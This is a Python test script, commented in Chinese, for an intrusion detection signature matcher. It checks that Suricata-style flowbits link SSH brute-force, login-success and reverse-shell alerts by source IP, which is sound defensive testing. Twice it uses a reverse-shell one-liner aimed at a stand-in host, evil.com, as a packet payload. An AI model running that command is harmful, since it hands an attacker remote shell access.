#!/usr/bin/env python3
"""Flowbits 跨规则状态传递功能测试"""
import sys, time
sys.path.insert(0, '.')

from core.misuse_detector import SignatureMatcher

m = SignatureMatcher('./signatures')
m.load_all()

base = {
    'dst_ip': '192.168.1.1', 'src_port': 44444,
    'dst_port': 22, 'app_protocol': 'SSH', 'timestamp': time.time()
}

print("=" * 60)
print("  Flowbits 攻击链测试 (Suricata 兼容)")
print("=" * 60)

# Step 1: 5 次 SSH 登录失败 → BRUTE-001 触发, 设置 ssh_failed_attempt
print("\nStep 1: 5 次 SSH 登录失败...")
src = '10.0.0.99'
alerts = []
for _ in range(5):
    alerts.extend(m.match_packet(
        {**base, 'src_ip': src, 'payload': b'Failed password for root'}
    ))
flags = m._flowbits_state.get(src, set())
print(f"  告警: {len(alerts)} 条")
print(f"  Flowbits: {flags}")

# Step 2: SSH 登录成功 → BRUTE-001-SUCCESS (需要 ssh_failed_attempt)
print("\nStep 2: 同一 IP SSH 登录成功 (Accepted password)...")
alerts2 = m.match_packet(
    {**base, 'src_ip': src, 'payload': b'Accepted password for root'}
)
print(f"  告警: {len(alerts2)} 条")
for a in alerts2:
    print(f"    [{a['severity']}] {a['signature_id']}: {a['signature_name'][:60]}")
flags2 = m._flowbits_state.get(src, set())
print(f"  Flowbits: {flags2}")

# Step 3: 反弹Shell → BACKDOOR-004-CHAIN (需要 ssh_compromised + reverse_shell_detected)
print("\nStep 3: 同一 IP 反弹Shell (bash -i >& /dev/tcp)...")
alerts3 = m.match_packet({
    **base, 'src_ip': src, 'dst_port': 80,
    'app_protocol': 'HTTP',
    'payload': b'bash -i >& /dev/tcp/evil.com/4444 0>&1'
})
print(f"  告警: {len(alerts3)} 条")
for a in alerts3:
    print(f"    [{a['severity']}] {a['signature_id']}: {a['signature_name'][:60]}")

# Step 4: 不同 IP 的 SSH 登录成功 → 不应触发 (flowbits 按 by_src 隔离)
print("\nStep 4: 不同 IP 的 SSH 登录成功 → 不应触发 BRUTE-001-SUCCESS")
other_ip = '192.168.1.50'
alerts4 = m.match_packet(
    {**base, 'src_ip': other_ip, 'payload': b'Accepted password for admin'}
)
succ_alerts = [a for a in alerts4 if 'SUCCESS' in a.get('signature_id', '')]
print(f"  告警: {len(alerts4)} 条, 其中SUCCESS联动: {len(succ_alerts)} 条")
assert len(succ_alerts) == 0, f"FAIL: 不同IP不应触发联动! got {len(succ_alerts)}"

# Step 5: 没有前置 SSH 失败的反弹Shell → 只触发普通规则
print("\nStep 5: 无前置SSH失败的反弹Shell → 只触发 BACKDOOR-004 (不触发 CHAIN)")
m2 = SignatureMatcher('./signatures')
m2.load_all()
alerts5 = m2.match_packet({
    **base, 'src_ip': '10.0.0.88', 'dst_port': 80,
    'app_protocol': 'HTTP',
    'payload': b'bash -i >& /dev/tcp/evil.com/4444 0>&1'
})
chain_alerts = [a for a in alerts5 if 'CHAIN' in a.get('signature_id', '')]
print(f"  告警: {len(alerts5)} 条, 其中CHAIN联动: {len(chain_alerts)} 条")
assert len(chain_alerts) == 0, f"FAIL: 无前置条件不应触发CHAIN!"

print("\n" + "=" * 60)
print("  Flowbits 测试全部通过!")
print("=" * 60)
